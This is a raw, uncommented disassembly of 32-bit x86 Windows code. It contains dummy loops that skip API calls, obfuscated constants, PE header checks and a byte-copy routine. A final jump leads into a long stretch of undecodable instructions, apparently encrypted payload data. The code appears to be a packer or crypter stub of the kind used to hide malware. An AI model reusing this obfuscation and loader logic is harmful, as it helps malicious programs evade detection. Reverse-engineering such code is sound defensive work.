  423bad:	mov    eax,DWORD PTR [esp+0x18]
  423bb1:	xor    eax,edi
  423bb3:	add    eax,ebx
  423bb5:	mov    ds:0x42a4f6,eax
  423bba:	mov    eax,DWORD PTR [esp+0x2c]
  423bbe:	test   eax,eax
  423bc0:	je     0x423d6c
  423bc6:	lea    eax,[esp+0x1b8]
  423bcd:	mov    DWORD PTR [esp+0x64],0xf152c3a
  423bd5:	push   eax
  423bd6:	mov    DWORD PTR [esp+0x78],0x712ed2f
  423bde:	mov    DWORD PTR [esp+0x74],0x373fc0d
  423be6:	push   0x42ae32
  423beb:	mov    DWORD PTR [esp+0x70],0x72670add
  423bf3:	call   DWORD PTR ds:0x42b312
  423bf9:	cmp    eax,0xffffffff
  423bfc:	jne    0x422c5a
  423c02:	push   0xf
  423c04:	lea    eax,[esp+0x44]
  423c08:	push   eax
  423c09:	push   0x42ae66
  423c0e:	push   0x42ae7a
  423c13:	push   0x42ae9e
  423c18:	call   esi
  423c1a:	imul   eax,eax,0x300000
  423c20:	cmp    eax,0x1b00000
  423c25:	jne    0x422c5a
  423c2b:	lea    eax,[esp+0x78]
  423c2f:	push   eax
  423c30:	push   0xffffffff
  423c32:	call   DWORD PTR ds:0x42b30a
  423c38:	test   eax,eax
  423c3a:	jne    0x422c5a
  423c40:	call   0x41b628
  423c45:	mov    eax,DWORD PTR [esp+0x34]
  423c49:	mov    eax,DWORD PTR [esp+0xc]
  423c4d:	mov    DWORD PTR [esp+0x30],eax
  423c51:	mov    eax,DWORD PTR [esp+0x18]
  423c55:	mov    DWORD PTR [esp+0xc],eax
  423c59:	mov    eax,eax
  423c5b:	mov    eax,ds:0x42a472
  423c60:	mov    ecx,DWORD PTR [eax+0x1c0]
  423c66:	mov    edx,DWORD PTR [ecx]
  423c68:	and    DWORD PTR [esp+0x14],0x0
  423c6d:	mov    esi,0xfabdbed4
  423c72:	add    edx,esi
  423c74:	adc    DWORD PTR [esp+0x14],0xffffffff
  423c79:	mov    ecx,0x8a29a141
  423c7e:	xor    edx,ecx
  423c80:	mov    DWORD PTR [esp+0x20],edx
  423c84:	mov    edx,DWORD PTR [esp+0x14]
  423c88:	xor    edx,0x0
  423c8b:	cmp    DWORD PTR [esp+0x20],0x70941f94
  423c93:	mov    DWORD PTR [esp+0x24],edx
  423c97:	jne    0x423ca6
  423c9d:	cmp    edx,0xffffffff
  423ca0:	je     0x423d0f
  423ca6:	mov    eax,DWORD PTR [eax+0x1c8]
  423cac:	mov    eax,DWORD PTR [eax]
  423cae:	cdq    
  423caf:	add    eax,esi
  423cb1:	adc    edx,0xffffffff
  423cb4:	and    DWORD PTR [esp+0x14],0x0
  423cb9:	xor    edx,0x0
  423cbc:	mov    DWORD PTR [esp+0x1c],edx
  423cc0:	mov    edx,DWORD PTR [esp+0xc]
  423cc4:	mov    DWORD PTR [esp+0x10],edx
  423cc8:	xor    eax,ecx
  423cca:	add    DWORD PTR [esp+0x10],esi
  423cce:	mov    edx,DWORD PTR [esp+0x10]
  423cd2:	adc    DWORD PTR [esp+0x14],0xffffffff
  423cd7:	xor    edx,ecx
  423cd9:	mov    DWORD PTR [esp+0x20],edx
  423cdd:	mov    edx,DWORD PTR [esp+0x14]
  423ce1:	xor    edx,0x0
  423ce4:	mov    DWORD PTR [esp+0x24],edx
  423ce8:	cmp    DWORD PTR [esp+0x20],eax
  423cec:	jne    0x423cfe
  423cf2:	mov    eax,DWORD PTR [esp+0x1c]
  423cf6:	cmp    edx,eax
  423cf8:	je     0x423d0f
  423cfe:	mov    eax,DWORD PTR [esp+0xc]
  423d02:	add    eax,DWORD PTR [esp+0x30]
  423d06:	mov    DWORD PTR [esp+0xc],eax
  423d0a:	jmp    0x423d6c
  423d0f:	mov    eax,ds:0x42a4f6
  423d14:	mov    edx,DWORD PTR ds:0x42a4fe
  423d1a:	xor    eax,edx
  423d1c:	mov    ds:0x42a4f6,eax
  423d21:	mov    edx,DWORD PTR ds:0x42a4f6
  423d27:	mov    eax,DWORD PTR [esp+0x2c]
  423d2b:	add    DWORD PTR [eax],edx
  423d2d:	mov    edx,DWORD PTR [esp+0xc]
  423d31:	mov    eax,ds:0x42a4f6
  423d36:	xor    edx,edi
  423d38:	add    edx,ebx
  423d3a:	xor    ebx,ebx
  423d3c:	add    edx,esi
  423d3e:	adc    ebx,0xffffffff
  423d41:	xor    edi,edi
  423d43:	xor    edx,ecx
  423d45:	xor    ebx,0x0
  423d48:	add    eax,esi
  423d4a:	adc    edi,0xffffffff
  423d4d:	xor    eax,ecx
  423d4f:	xor    edi,0x0
  423d52:	cmp    eax,edx
  423d54:	jne    0x423d6c
  423d5a:	cmp    edi,ebx
  423d5c:	jne    0x423d6c
  423d62:	mov    eax,ds:0x42a4f6
  423d67:	mov    ds:0x42a4fe,eax
  423d6c:	lea    eax,[esp+0x1b8]
  423d73:	push   eax
  423d74:	push   0x42aece
  423d79:	call   DWORD PTR ds:0x42b312
  423d7f:	cmp    eax,0xffffffff
  423d82:	jne    0x422c5a
  423d88:	push   0xf
  423d8a:	lea    eax,[esp+0x44]
  423d8e:	push   eax
  423d8f:	push   0x42af02
  423d94:	push   0x42af16
  423d99:	push   0x42af3a
  423d9e:	call   DWORD PTR ds:0x42b302
  423da4:	imul   eax,eax,0x300000
  423daa:	cmp    eax,0x1b00000
  423daf:	jne    0x422c5a
  423db5:	lea    eax,[esp+0x78]
  423db9:	push   eax
  423dba:	push   0xffffffff
  423dbc:	call   DWORD PTR ds:0x42b30a
  423dc2:	test   eax,eax
  423dc4:	jne    0x422c5a
  423dca:	mov    eax,ds:0x42a472
  423dcf:	push   0x4
  423dd1:	add    eax,0x1cc
  423dd6:	push   eax
  423dd7:	lea    eax,[esp+0x3c]
  423ddb:	push   eax
  423ddc:	call   0x423df0
  423de1:	mov    eax,DWORD PTR [esp+0x34]
  423de5:	mov    eax,DWORD PTR [eax]
  423de7:	pop    edi
  423de8:	pop    esi
  423de9:	pop    ebx
  423dea:	mov    esp,ebp
  423dec:	pop    ebp
  423ded:	ret    0xc
  423df0:	push   ebp
  423df1:	mov    ebp,esp
  423df3:	sub    esp,0x10
  423df6:	mov    eax,0xf89c85a5
  423dfb:	mov    DWORD PTR ds:0x42b222,0x14
  423e05:	cmp    DWORD PTR ds:0x42b222,0x0
  423e0c:	je     0x423e66
  423e12:	cmp    DWORD PTR ds:0x42b222,0x9
  423e19:	jbe    0x423e66
  423e1f:	jmp    0x423e38
  423e24:	push   0x42a03d
  423e29:	push   0x1
  423e2b:	push   0x1
  423e2d:	push   0x14be
  423e32:	call   DWORD PTR ds:0x42b2ee
  423e38:	cmp    DWORD PTR ds:0x42b222,0xa
  423e3f:	jne    0x423e54
  423e45:	xor    edx,edx
  423e47:	add    edx,DWORD PTR ds:0x42b222
  423e4d:	dec    edx
  423e4e:	mov    DWORD PTR ds:0x42b222,edx
  423e54:	mov    edx,DWORD PTR ds:0x42b222
  423e5a:	dec    edx
  423e5b:	mov    DWORD PTR ds:0x42b222,edx
  423e61:	jmp    0x423e05
  423e66:	mov    DWORD PTR [ebp-0x4],eax
  423e69:	and    DWORD PTR ds:0x42b1fa,0x0
  423e73:	jmp    0x423e85
  423e78:	mov    edx,DWORD PTR ds:0x42b1fa
  423e7e:	inc    edx
  423e7f:	mov    DWORD PTR ds:0x42b1fa,edx
  423e85:	cmp    DWORD PTR ds:0x42b1fa,0x19
  423e8c:	jae    0x423ece
  423e92:	cmp    DWORD PTR ds:0x42b1fa,0xc
  423e99:	jg     0x423ece
  423e9f:	jmp    0x423eaf
  423ea4:	push   0x863f
  423ea9:	call   DWORD PTR ds:0x42b2f2
  423eaf:	cmp    DWORD PTR ds:0x42b1fa,0xb
  423eb6:	jne    0x423ec9
  423ebc:	mov    edx,DWORD PTR ds:0x42b1fa
  423ec2:	inc    edx
  423ec3:	mov    DWORD PTR ds:0x42b1fa,edx
  423ec9:	jmp    0x423e78
  423ece:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  423ed5:	mov    edx,DWORD PTR ds:0x42b1aa
  423edb:	or     edx,DWORD PTR ds:0x42b1da
  423ee1:	mov    DWORD PTR ds:0x42b1aa,edx
  423ee7:	mov    ecx,DWORD PTR [ebp-0x4]
  423eea:	not    edx
  423eec:	push   esi
  423eed:	and    edx,esi
  423eef:	mov    edx,0x75108ae
  423ef4:	xor    ecx,edx
  423ef6:	adc    DWORD PTR ds:0x42b18e,ebx
  423efc:	mov    esi,0x3272f5
  423f01:	and    DWORD PTR ds:0x42b186,0x14f5
  423f0b:	push   edi
  423f0c:	adc    edi,DWORD PTR ds:0x42b1c2
  423f12:	mov    edi,DWORD PTR [ebp+0x10]
  423f15:	xor    DWORD PTR ds:0x42b1fa,0x42b1ce
  423f1f:	add    ecx,esi
  423f21:	mov    DWORD PTR ds:0x42b1da,0x1b10
  423f2b:	cmp    ecx,edi
  423f2d:	mov    DWORD PTR ds:0x42b1d6,0x199
  423f37:	je     0x42401c
  423f3d:	xor    edi,ecx
  423f3f:	mov    ecx,DWORD PTR [ebp-0x4]
  423f42:	sbb    DWORD PTR ds:0x42b202,0x792c
  423f4c:	mov    edi,DWORD PTR [ebp+0x10]
  423f4f:	sub    DWORD PTR ds:0x42b1ba,0xd36
  423f59:	xor    eax,eax
  423f5b:	xor    ecx,edx
  423f5d:	xor    DWORD PTR ds:0x42b216,0x49be
  423f67:	add    ecx,esi
  423f69:	add    edi,0xfabdbed4
  423f6f:	adc    eax,0xffffffff
  423f72:	xor    eax,0x0
  423f75:	mov    DWORD PTR [ebp-0xc],eax
  423f78:	push   ebx
  423f79:	xor    ebx,ebx
  423f7b:	xor    edi,0x8a29a141
  423f81:	mov    eax,ecx
  423f83:	add    eax,0xfabdbed4
  423f88:	adc    ebx,0xffffffff
  423f8b:	xor    eax,0x8a29a141
  423f90:	xor    ebx,0x0
  423f93:	cmp    eax,edi
  423f95:	jne    0x423fae
  423f9b:	cmp    ebx,DWORD PTR [ebp-0xc]
  423f9e:	je     0x424016
  423fa4:	jmp    0x423fae
  423fa9:	mov    esi,0x3272f5
  423fae:	mov    eax,DWORD PTR [ebp-0x4]
  423fb1:	mov    edi,DWORD PTR [ebp-0x8]
  423fb4:	xor    edi,edx
  423fb6:	add    edi,esi
  423fb8:	mov    esi,DWORD PTR [ebp+0x8]
  423fbb:	imul   edi,ecx
  423fbe:	mov    ebx,DWORD PTR [ebp+0xc]
  423fc1:	xor    eax,edx
  423fc3:	add    eax,ecx
  423fc5:	mov    al,BYTE PTR [ebx+eax*1+0x3272f5]
  423fcc:	mov    BYTE PTR [edi+esi*1],al
  423fcf:	mov    eax,DWORD PTR [ebp-0x8]
  423fd2:	mov    esi,DWORD PTR [ebp+0x10]
  423fd5:	xor    eax,edx
  423fd7:	xor    ebx,ebx
  423fd9:	add    esi,0xfabdbed4
  423fdf:	adc    ebx,0xffffffff
  423fe2:	lea    ecx,[ecx+eax*1+0x3272f5]
  423fe9:	xor    edi,edi
  423feb:	xor    esi,0x8a29a141
  423ff1:	xor    ebx,0x0
  423ff4:	mov    eax,ecx
  423ff6:	add    eax,0xfabdbed4
  423ffb:	adc    edi,0xffffffff
  423ffe:	xor    eax,0x8a29a141
  424003:	xor    edi,0x0
  424006:	cmp    eax,esi
  424008:	jne    0x423fa9
  42400e:	cmp    edi,ebx
  424010:	jne    0x423fa9
  424016:	mov    eax,0xf89c85a2
  42401b:	pop    ebx
  42401c:	pop    edi
  42401d:	pop    esi
  42401e:	leave  
  42401f:	ret    0xc
  424022:	push   ebp
  424023:	mov    ebp,esp
  424025:	push   ecx
  424026:	and    DWORD PTR ds:0x42b19e,0x0
  424030:	jmp    0x424043
  424035:	xor    eax,eax
  424037:	xor    eax,DWORD PTR ds:0x42b19e
  42403d:	inc    eax
  42403e:	mov    ds:0x42b19e,eax
  424043:	cmp    DWORD PTR ds:0x42b19e,0x14
  42404a:	jae    0x424072
  424050:	cmp    DWORD PTR ds:0x42b19e,0x1e
  424057:	jg     0x424072
  42405d:	jmp    0x42406d
  424062:	push   0x42b182
  424067:	call   DWORD PTR ds:0x42b2f6
  42406d:	jmp    0x424035
  424072:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424079:	and    DWORD PTR ds:0x42b1b2,0x0
  424083:	xor    ecx,ecx
  424085:	xor    ecx,DWORD PTR ds:0x42b1b2
  42408b:	inc    ecx
  42408c:	mov    DWORD PTR ds:0x42b1b2,ecx
  424092:	cmp    DWORD PTR ds:0x42b1b2,0x4
  424099:	jle    0x4240e5
  42409f:	jmp    0x4240be
  4240a4:	push   0x42b206
  4240a9:	push   0x42b1c6
  4240ae:	push   0x6e36
  4240b3:	push   0x42a0fe
  4240b8:	call   DWORD PTR ds:0x42b2fa
  4240be:	cmp    DWORD PTR ds:0x42b1b2,0x3
  4240c5:	jne    0x4240d8
  4240cb:	mov    ecx,DWORD PTR ds:0x42b1b2
  4240d1:	inc    ecx
  4240d2:	mov    DWORD PTR ds:0x42b1b2,ecx
  4240d8:	cmp    DWORD PTR ds:0x42b1b2,0x1b
  4240df:	jb     0x424083
  4240e5:	mov    eax,DWORD PTR [ebp+0x8]
  4240e8:	movsx  eax,BYTE PTR [eax]
  4240eb:	mov    edx,0x3272f5
  4240f0:	sub    eax,edx
  4240f2:	mov    ecx,0x75108ae
  4240f7:	xor    eax,ecx
  4240f9:	cmp    eax,0xf89c85f6
  4240fe:	jne    0x42412d
  424104:	mov    eax,DWORD PTR [ebp+0x8]
  424107:	push   esi
  424108:	mov    esi,DWORD PTR [ebp+0x8]
  42410b:	add    esi,DWORD PTR [eax+0x3c]
  42410e:	mov    DWORD PTR [ebp+0x8],esi
  424111:	mov    eax,DWORD PTR [ebp-0x4]
  424114:	mov    esi,DWORD PTR [ebp+0x8]
  424117:	xor    eax,ecx
  424119:	add    eax,edx
  42411b:	cmp    DWORD PTR [esi+0x54],eax
  42411e:	pop    esi
  42411f:	je     0x42412d
  424125:	mov    eax,DWORD PTR [ebp+0x8]
  424128:	jmp    0x424134
  42412d:	mov    eax,DWORD PTR [ebp-0x4]
  424130:	xor    eax,ecx
  424132:	add    eax,edx
  424134:	leave  
  424135:	ret    0x4
  424138:	push   ebp
  424139:	mov    ebp,esp
  42413b:	sub    esp,0xc
  42413e:	and    DWORD PTR ds:0x42b1c6,0x0
  424148:	jmp    0x42415a
  42414d:	mov    edx,DWORD PTR ds:0x42b1c6
  424153:	inc    edx
  424154:	mov    DWORD PTR ds:0x42b1c6,edx
  42415a:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  424161:	jae    0x4241a8
  424167:	cmp    DWORD PTR ds:0x42b1c6,0xd
  42416e:	jle    0x4241a8
  424174:	jmp    0x424189
  424179:	push   0x42b216
  42417e:	push   0x42a1f3
  424183:	call   DWORD PTR ds:0x42b2fe
  424189:	cmp    DWORD PTR ds:0x42b1c6,0xc
  424190:	jne    0x4241a3
  424196:	mov    edx,DWORD PTR ds:0x42b1c6
  42419c:	inc    edx
  42419d:	mov    DWORD PTR ds:0x42b1c6,edx
  4241a3:	jmp    0x42414d
  4241a8:	push   esi
  4241a9:	and    DWORD PTR ds:0x42b222,0x0
  4241b3:	xor    esi,esi
  4241b5:	or     esi,DWORD PTR ds:0x42b222
  4241bb:	inc    esi
  4241bc:	mov    DWORD PTR ds:0x42b222,esi
  4241c2:	cmp    DWORD PTR ds:0x42b222,0x7
  4241c9:	jl     0x424211
  4241cf:	jmp    0x4241ea
  4241d4:	push   DWORD PTR [ebp-0x28]
  4241d7:	push   DWORD PTR [ebp-0x24]
  4241da:	push   0x42a1b7
  4241df:	push   0x400000
  4241e4:	call   DWORD PTR ds:0x42b306
  4241ea:	cmp    DWORD PTR ds:0x42b222,0x6
  4241f1:	jne    0x424204
  4241f7:	mov    esi,DWORD PTR ds:0x42b222
  4241fd:	inc    esi
  4241fe:	mov    DWORD PTR ds:0x42b222,esi
  424204:	cmp    DWORD PTR ds:0x42b222,0x15
  42420b:	jb     0x4241b3
  424211:	mov    esi,0xf89c85a5
  424216:	or     DWORD PTR ds:0x42b1d6,0x459e
  424220:	mov    DWORD PTR [ebp-0x8],esi
  424223:	and    DWORD PTR ds:0x42b1d6,0x0
  42422d:	jmp    0x424241
  424232:	xor    ecx,ecx
  424234:	xor    ecx,DWORD PTR ds:0x42b1d6
  42423a:	inc    ecx
  42423b:	mov    DWORD PTR ds:0x42b1d6,ecx
  424241:	cmp    DWORD PTR ds:0x42b1d6,0x1c
  424248:	jae    0x42428f
  42424e:	cmp    DWORD PTR ds:0x42b1d6,0xf
  424255:	jge    0x42428f
  42425b:	jmp    0x424270
  424260:	push   0x42a1a1
  424265:	push   0x0
  424267:	push   DWORD PTR [ebp-0x20]
  42426a:	call   DWORD PTR ds:0x42b30e
  424270:	cmp    DWORD PTR ds:0x42b1d6,0xe
  424277:	jne    0x42428a
  42427d:	mov    ecx,DWORD PTR ds:0x42b1d6
  424283:	inc    ecx
  424284:	mov    DWORD PTR ds:0x42b1d6,ecx
  42428a:	jmp    0x424232
  42428f:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  424296:	push   edi
  424297:	mov    eax,eax
  424299:	mov    eax,DWORD PTR [ebp-0x4]
  42429c:	mov    edi,DWORD PTR [ebp-0x8]
  42429f:	mov    ecx,0x75108ae
  4242a4:	xor    eax,ecx
  4242a6:	xor    edi,ecx
  4242a8:	mov    edx,0x3272f5
  4242ad:	add    edi,edx
  4242af:	add    eax,edx
  4242b1:	imul   eax,edi
  4242b4:	mov    edi,DWORD PTR [ebp+0xc]
  4242b7:	jmp    0x42585a
  4242bc:	jge    0x42427f
  4242be:	jnp    0x42427a
  4242c0:	mov    bh,0xb2
  4242c2:	mov    dl,0xbe
  4242c4:	jmp    0x8c2776ec
  4242c9:	call   0x8380:0x9592d298
  4242d0:	std    
  4242d1:	ins    BYTE PTR es:[edi],dx
  4242d2:	add    DWORD PTR [ebx+0x4e0d8890],0x62
  4242d9:	sbb    dl,dl
  4242db:	mov    bl,0x79
  4242dd:	jb     0x42429b
  4242df:	in     al,dx
  4242e0:	xor    al,BYTE PTR [edi-0x3e]
  4242e3:	dec    esi
  4242e4:	jle    0x4242b6
  4242e6:	ret    0x887
  4242e9:	jecxz  0x4242a1
  4242eb:	gs inc eax
  4242ed:	pop    ebp
  4242ee:	ins    BYTE PTR es:[edi],dx
  4242ef:	adc    ecx,DWORD PTR [eax]
  4242f1:	mov    ch,0x97
  4242f3:	cli    
  4242f4:	sub    cl,0x1
  4242f7:	and    ch,bh
  4242f9:	dec    ecx
  4242fa:	neg    BYTE PTR [edi-0x51]
  4242fd:	pusha  
  4242fe:	cdq    
  4242ff:	and    al,0x1e
  424301:	add    eax,0xd0b0ee7b
  424306:	sbb    eax,0xc5ee0f86
  42430b:	adc    eax,0x5427c9d8
  424310:	pop    ecx
  424311:	inc    BYTE PTR [ebx-0x56]
  424314:	(bad)  [esi+0x587636c0]
  42431a:	loopne 0x424389
  42431c:	iret   
  42431d:	jmp    0x4242af
  42431f:	mov    ah,0x39
  424321:	cmp    ecx,DWORD PTR [esi+ebx*1+0x6b]
  424325:	sub    eax,0x82681eb2
  42432a:	repnz and eax,0x320751d6
  424330:	in     eax,dx
  424331:	ins    DWORD PTR es:[edi],dx
  424332:	pop    eax
  424333:	test   eax,0xe4c96204
  424338:	sar    BYTE PTR [edi],0x8a
  42433b:	or     esp,DWORD PTR [esi+0x49]
  42433e:	mov    ch,BYTE PTR [edi+0x1bfbde80]
  424344:	push   ebp
  424345:	push   0x3e548653
  42434a:	aas    
  42434b:	imul   edi,DWORD PTR [edx+0x53],0xa9158d86
  424352:	aas    
  424353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424354:	int    0xdd
  424356:	aam    0x84
  424358:	dec    esi
  424359:	hlt    
  42435a:	xchg   ebx,eax
  42435b:	outs   dx,DWORD PTR ds:[esi]
  42435c:	add    eax,0x797fb574
  424361:	data16 mov ds:0x37e89d3a,al
  424367:	outs   dx,BYTE PTR ds:[esi]
  424368:	pushf  
  424369:	sbb    dl,ch
  42436b:	and    DWORD PTR [edi-0x4f],ecx
  42436e:	add    eax,0xa8cf4f2a
  424373:	mov    dh,cl
  424375:	sar    ebp,cl
  424377:	scas   al,BYTE PTR es:[edi]
  424378:	mov    eax,0x786b5154
  42437d:	mov    dh,BYTE PTR [ecx-0x50c5c853]
  424383:	adc    DWORD PTR [ecx+0x7a6aa970],esi
  424389:	inc    esi
  42438a:	or     al,0x62
  42438c:	fimul  DWORD PTR [edx-0x24]
  42438f:	dec    ebp
  424390:	and    bl,0xe0
  424393:	rcr    BYTE PTR [esi+0x51b1fb04],0x52
  42439a:	xor    eax,0x639d1e06
  42439f:	or     ah,BYTE PTR ds:0x7b50ba96
  4243a5:	dec    ebx
  4243a6:	(bad)  
  4243a7:	sbb    eax,0xa21384da
  4243ac:	cwde   
  4243ad:	and    BYTE PTR [edi],al
  4243af:	pushf  
  4243b0:	in     al,dx
  4243b1:	and    eax,0xb4e3c73b
  4243b6:	and    BYTE PTR ss:[esi-0x7],al
  4243ba:	cmp    edi,esi
  4243bc:	xchg   esi,eax
  4243bd:	je     0x4243b3
  4243bf:	fs pop esp
  4243c1:	push   esi
  4243c2:	xchg   edi,eax
  4243c3:	adc    dh,BYTE PTR es:[ebp-0x7bd79988]
  4243ca:	dec    edx
  4243cb:	push   ebx
  4243cc:	xor    bl,0x28
  4243cf:	mov    esp,0x716c9b7a
  4243d4:	(bad)  
  4243d5:	mov    al,ds:0x4ddcf10a
  4243da:	out    0x6e,al
  4243dc:	(bad)  
  4243dd:	push   ebx
  4243de:	push   ecx
  4243df:	int    0x21
  4243e1:	aad    0xed
  4243e3:	ror    BYTE PTR [eax+ebx*1+0x583aa146],1
  4243ea:	and    eax,0x87dd5e7
  4243ef:	add    BYTE PTR [ebp-0x62],bh
  4243f2:	xchg   BYTE PTR [edx-0x3c923b73],dh
  4243f8:	pop    edi
  4243f9:	(bad)  
  4243fa:	sahf   
  4243fb:	pop    esp
  4243fc:	xlat   BYTE PTR ds:[ebx]
  4243fd:	inc    esp
  4243fe:	sub    ebx,DWORD PTR [ebp-0x7ec75d1a]
  424404:	and    al,ah
  424406:	(bad)  
  424407:	fdiv   DWORD PTR [eax+0x55]
  42440a:	xchg   ebx,eax
  42440b:	or     al,0x9c
  42440d:	icebp  
  42440e:	xlat   BYTE PTR ds:[ebx]
  42440f:	or     ebp,edx
  424411:	sbb    cl,dl
  424413:	sub    BYTE PTR [ebp+0x30756a27],al
  424419:	dec    esp
  42441a:	and    eax,DWORD PTR ds:0xe65dd0b4
  424420:	rol    cl,cl
  424422:	push   ebp
  424423:	stc    
  424424:	jae    0x4243c0
  424426:	ja     0x424490
  424428:	and    DWORD PTR [ebx-0x74],esi
  42442b:	mov    edx,esi
  42442d:	jle    0x424416
  42442f:	mov    al,ds:0x60c75de2
  424434:	inc    ebx
  424435:	push   ebp
  424436:	and    BYTE PTR [eax-0x6b],dh
  424439:	pop    ds
  42443a:	leave  
  42443b:	icebp  
  42443c:	mov    esp,0x16d552c9
  424441:	arpl   si,sp
  424443:	shl    DWORD PTR [ebp-0x4],cl
  424446:	(bad)  
  424447:	dec    esi
  424448:	not    BYTE PTR [ebp-0x37]
  42444b:	leave  
  42444c:	sahf   
  42444d:	sbb    al,0xcb
  42444f:	mov    al,ds:0x65261b20
  424454:	ror    DWORD PTR [esi+ebp*4+0x18],0xfa
  424459:	test   DWORD PTR [edx+0xf52a7d],ecx
  42445f:	and    eax,ebx
  424461:	pushf  
  424462:	cmp    al,0x31
  424464:	fadd   QWORD PTR [esi+eax*8+0x39c20589]
  42446b:	jbe    0x42449d
  42446d:	outs   dx,BYTE PTR ds:[esi]
  42446e:	mov    eax,ds:0x8c3c784e
  424473:	mov    WORD PTR [esp+esi*8-0x1feb116a],ds
  42447a:	cmp    BYTE PTR [edi],ah
  42447c:	nop
  42447d:	ins    DWORD PTR es:[edi],dx
  42447e:	or     BYTE PTR [edx],bl
  424480:	(bad)  
  424481:	aam    0x51
  424483:	cdq    
  424484:	sub    dh,BYTE PTR [ebx+edi*8]
  424487:	push   ecx
  424488:	inc    edx
  424489:	xor    al,0x44
  42448b:	push   0x816c0225
  424490:	pop    esi
  424491:	dec    esp
  424492:	fsubr  DWORD PTR ds:0xdcb358c4
  424498:	sub    BYTE PTR [esp+eax*2-0x2acc85c2],bh
  42449f:	jmp    0x4244d5
  4244a1:	and    BYTE PTR [eax],dl
  4244a3:	add    DWORD PTR [edx-0x4a88606f],edx
  4244a9:	add    ah,ah
  4244ab:	scas   al,BYTE PTR es:[edi]
  4244ac:	test   BYTE PTR [edi],dh
  4244ae:	cli    
  4244af:	pop    edx
  4244b0:	rcl    BYTE PTR [ebx-0x15],0x75
  4244b4:	and    edx,esi
  4244b6:	nop
  4244b7:	bound  esi,QWORD PTR [edx-0x6d]
  4244ba:	icebp  
  4244bb:	mov    DWORD PTR [eax-0x1c2353aa],esp
  4244c1:	pop    esi
  4244c2:	dec    ebx
  4244c3:	dec    ebx
  4244c4:	jmp    0x424456
  4244c6:	sbb    al,0xa3
  4244c8:	xchg   ebp,eax
  4244c9:	fwait
  4244ca:	loope  0x4244e0
  4244cc:	in     al,0x3c
  4244ce:	xchg   esi,eax
  4244cf:	xchg   ebp,eax
  4244d0:	pop    ebp
  4244d1:	repnz nop
  4244d3:	xchg   ebx,eax
  4244d4:	in     al,0x50
  4244d6:	push   edi
  4244d7:	xor    cl,cl
  4244d9:	and    al,0x20
  4244db:	inc    edi
  4244dc:	add    BYTE PTR [ebp-0x1550a9ee],al
  4244e2:	inc    eax
  4244e3:	dec    esp
  4244e4:	fs xchg ecx,eax
  4244e6:	pushf  
  4244e7:	icebp  
  4244e8:	dec    eax
  4244e9:	jmp    0x4c4edbdd
  4244ee:	(bad)  
  4244ef:	push   ebp
  4244f0:	add    ebx,DWORD PTR [ebx+edx*1-0x17368de4]
  4244f7:	xchg   dh,al
  4244f9:	sub    DWORD PTR [ebp-0x45c6fe34],edi
  4244ff:	jnp    0x424567
  424501:	adc    al,BYTE PTR [eax-0x76]
  424504:	push   esi
  424505:	(bad)  
  424507:	mov    bh,BYTE PTR ds:0x3be9de6b
  42450d:	je     0x42449a
  42450f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424510:	xor    dl,BYTE PTR [eax]
  424512:	sbb    DWORD PTR [esi],ebx
  424514:	mov    ebp,0xdf2d8437
  424519:	xchg   esi,eax
  42451a:	and    esi,DWORD PTR [eax]
  42451c:	sub    eax,ebx
  42451e:	or     edi,esp
  424520:	cli    
  424521:	adc    ebx,edi
  424523:	push   esp
  424524:	fwait
  424525:	(bad)  
  424526:	int    0xdc
  424528:	mov    al,0xe9
  42452a:	and    bh,dh
  42452c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42452d:	push   ss
  42452e:	xchg   ebx,eax
  42452f:	xchg   ecx,eax
  424530:	call   0x55fa:0x1c9afebe
  424537:	xchg   esp,ebp
  424539:	sub    al,0x5d
  42453b:	adc    BYTE PTR [esp+esi*2],cl
  42453e:	and    DWORD PTR [ebp-0x17],eax
  424541:	js     0x4244f6
  424543:	idiv   DWORD PTR [esi-0x22c0d00d]
  424549:	scas   al,BYTE PTR es:[edi]
  42454a:	xchg   esi,eax
  42454b:	cmp    cl,BYTE PTR [ebx+0x7c]
  42454e:	in     al,0xb9
  424550:	mov    ds:0xfdde24f0,eax
  424555:	pop    edi
  424556:	(bad)  
  424557:	shr    dh,cl
  424559:	inc    eax
  42455a:	(bad)  
  42455b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42455c:	leave  
  42455d:	stos   DWORD PTR es:[edi],eax
  42455e:	inc    eax
  42455f:	jle    0x424565
  424561:	inc    ecx
  424562:	dec    edx
  424563:	mov    dl,0x2f
  424565:	cmp    al,BYTE PTR [esi]
  424567:	jo     0x4245da
  424569:	inc    ecx
  42456a:	iret   
  42456b:	xchg   ebp,eax
  42456c:	xchg   esi,eax
  42456d:	jb     0x4245e9
  42456f:	dec    edi
  424570:	leave  
  424571:	push   ecx
  424573:	xchg   BYTE PTR [eax],bh
  424575:	mov    eax,DWORD PTR [esp+edi*2+0x45b01a25]
  42457c:	enter  0xb710,0x18
  424580:	dec    ebx
  424581:	in     eax,dx
  424582:	dec    edi
  424583:	inc    eax
  424584:	mov    esp,0xad0d305a
  424589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42458a:	adc    BYTE PTR [edi],dl
  42458c:	mov    ebp,0x92b94228
  424591:	dec    edx
  424592:	mov    ecx,0x2373a49b
  424597:	stos   DWORD PTR es:[edi],eax
  424598:	ror    BYTE PTR [edx-0x134f233b],1
  42459e:	in     al,0x14
  4245a0:	in     al,0x33
  4245a2:	mov    eax,DWORD PTR [esi]
  4245a4:	push   ebp
  4245a5:	fwait
  4245a6:	loopne 0x4245c0
  4245a8:	call   0xa2b9adab
  4245ad:	shl    BYTE PTR ss:[eax+0x6],1
  4245b1:	out    dx,eax
  4245b2:	fisub  WORD PTR [esi-0x23d3b84a]
  4245b8:	xor    eax,0xb9c8f92a
  4245bd:	mov    ds:0x66299ffa,eax
  4245c2:	jmp    0xcbcd:0xeb08d30e
  4245c9:	(bad)  
  4245ca:	out    dx,eax
  4245cb:	add    eax,0xb622630a
  4245d0:	cmp    edi,DWORD PTR [ebx+eiz*2-0x45e9888b]
  4245d7:	hlt    
  4245d8:	arpl   di,si
  4245da:	and    eax,0xc401c304
  4245df:	call   0x1c0e8c54
  4245e4:	(bad)  
  4245e5:	stc    
  4245e6:	mov    ebx,0x55ff4ad2
  4245eb:	enter  0x48ae,0xb7
  4245ef:	jmp    0xc6d8:0x25039301
